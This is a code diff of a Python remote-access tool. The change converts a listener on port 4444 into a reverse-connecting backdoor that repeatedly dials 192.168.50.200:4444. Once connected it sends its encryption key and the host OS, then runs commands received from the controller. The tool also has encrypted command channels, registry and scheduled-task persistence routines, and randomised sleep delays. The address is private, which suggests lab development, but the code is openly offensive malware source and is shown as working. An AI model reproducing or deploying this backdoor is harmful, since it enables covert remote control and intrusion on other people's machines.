@@ -6,6 +6,9 @@ import ctypes
 import subprocess
 from cryptography.fernet import Fernet
 import platform
+import random
+
+
 
 # ------------------ Encryption ------------------
 
@@ -20,6 +23,12 @@ def decrypt(data: bytes) -> bytes:
 
 def to_chunks(data: bytes, chunk_size: int = 1024):
     return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
+
+# ------------------ Smart sleep ------------------
+def smart_sleep():
+    delay = random.randint(20, 40)
+    print(f"[*] Sleeping for {delay} seconds...")
+    time.sleep(delay)
 
 # ------------------ Registry Persistence ------------------
 
@@ -109,7 +118,8 @@ class ClientHandler:
                 cmd = decrypt(self.recv()).decode()
                 print(f"[Received] {cmd}")
                 if cmd == "close":
-                    break
+                    self.connection.close()
+                    sys.exit()
 
                 elif cmd == "dir":
                     if os_name=="Windows":
@@ -192,26 +202,29 @@ class ClientHandler:
 
 # ------------------ Main Server ------------------
 
-def start_server():
+def Connect_to_server():
     operating_system = predict_operating_system()
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        sock.bind(("0.0.0.0", 4444))
-        sock.listen(1)
-        print("[*] Waiting for connection...")
-        conn, addr = sock.accept()
-        print(f"[*] Connection from {addr}")
-        conn.sendall(key)
-        time.sleep(1)
-        conn.sendall(operating_system.encode())
-
-        client = ClientHandler(conn)
-        if client.authenticate():
-            # add_to_startup_registry()
-            # remove_from_registry()
-            client.handle_commands(operating_system)
-        conn.close()
+        while 1:
+            try:
+                sock.connect(("192.168.50.200",4444))
+                print("[*] Connected to server ...    ")
+                time.sleep(1)
+                sock.sendall(key)
+                time.sleep(1)
+                sock.sendall(operating_system.encode())
+                client = ClientHandler(sock)
+                if client.authenticate():
+                    client.handle_commands(operating_system)
+                sock.close()
+            except Exception as e:
+                timer = 20
+                print("Server is not up yet. Trying again in")
+                for i in range(timer,0,-1):
+                    print(f"{i} seconds ", end="\r",flush=True)
+                    time.sleep(1)
 
 if __name__ == "__main__":
-    # create_persistent_task()
-    remove_task()
-    start_server()
+    #create_persistent_task()
+    #remove_task()
+    Connect_to_server()
